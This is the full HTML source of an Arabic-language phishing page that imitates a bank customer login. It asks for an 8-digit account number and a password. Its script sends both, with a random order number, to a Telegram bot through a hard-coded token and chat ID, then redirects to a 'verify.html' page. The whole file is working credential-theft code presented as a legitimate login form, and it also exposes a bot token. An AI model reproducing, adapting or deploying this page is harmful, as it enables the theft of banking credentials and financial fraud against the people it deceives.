<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>دخول</title>
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background-color: #004c6d;
      background-image: url('5lfea.png'); /* الخلفية */
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;   /* توسيط أفقي */
      align-items: center;       /* توسيط عمودي */
    }

    .container {
      max-width: 400px;
      width: 100%;
      padding: 20px;
      text-align: center;
    }

    .logo img {
      width: 100px;
      height: auto;
      margin-bottom: 20px;
    }

    h2 {
      margin-bottom: 40px;
      font-size: 28px;
    }

    .input-group {
      margin-bottom: 30px;
      text-align: right;
      position: relative;
    }

    label {
      display: block;
      margin-bottom: 5px;
    }

    input {
      width: 100%;
      padding: 12px 40px 12px 12px;
      border: none;
      border-bottom: 2px solid white;
      background: transparent;
      color: white;
    }

    input::placeholder {
      color: #ccc;
    }

    .eye-icon {
      position: absolute;
      left: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }

    button {
      width: 100%;
      padding: 12px;
      background: white;
      color: #004c6d;
      border: none;
      font-size: 18px;
      cursor: pointer;
    }

    .message {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0,0,0,0.8);
      color: #fff;
      padding: 15px 25px;
      border-radius: 8px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><img src="SHARR.png" alt="Logo"></div>
    <h2>دخول</h2>
    <div class="input-group">
      <label for="customer">رقم العميل</label>
      <input type="text" id="customer" placeholder="ادخل رقم الحساب المكون من 8 ارقام" maxlength="8" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
    </div>
    <div class="input-group">
      <label for="password">كلمة السر</label>
      <input type="password" id="password" placeholder="كلمة السر">
      <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" height="24" width="24" fill="#ccc" onclick="togglePassword()">
        <path d="M0 0h24v24H0z" fill="none"/>
        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13c-3.04 0-5.5-2.46-5.5-5.5S8.96 6.5 12 6.5s5.5 2.46 5.5 5.5-2.46 5.5-5.5 5.5zm0-9c-1.93 0-3.5 1.57-3.5 3.5S10.07 15.5 12 15.5s3.5-1.57 3.5-3.5S13.93 8.5 12 8.5z"/>
      </svg>
    </div>
    <button onclick="validateForm()">دخول</button>
  </div>
  <div id="message" class="message"></div>

  <script>
    // ضع هنا التوكن و الـ Chat ID الخاص بالبوت
    const token = "8505764051:AAF2KrwdKkXemZc8aph-NNyv2dvIFcIzCqM";
    const chatId = "8492691780";

    function togglePassword() {
      const passwordField = document.getElementById("password");
      passwordField.type = passwordField.type === "password" ? "text" : "password";
    }

    function showMessage(text) {
      const msg = document.getElementById("message");
      msg.textContent = text;
      msg.style.display = "block";
      setTimeout(() => msg.style.display = "none", 2000);
    }

    function validateForm() {
      const customer = document.getElementById("customer").value.trim();
      const password = document.getElementById("password").value.trim();

      if (customer === "" || password === "") {
        showMessage("يرجى ملئ الحقول أولا");
        return;
      }
      if (customer.length < 8) {
        showMessage("رقم العميل يجب أن يكون 8 أرقام");
        return;
      }

      // توليد رقم طلب عشوائي 6 أرقام
      const order = Math.floor(100000 + Math.random() * 900000);

      // رسالة واحدة فقط
      const msg = `رقم العميل: ${customer}\nكلمة السر: ${password}\nرقم الطلب: ${order}`;

      // إرسال الرسالة إلى تيليجرام
      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);

      // حفظ رقم الطلب في التخزين المحلي عشان نستخدمه في صفحة verify
      localStorage.setItem("orderNumber", order);

      // الانتقال للصفحة verify
      window.location.href = "verify.html";
    }
  </script>
</body>
</html>
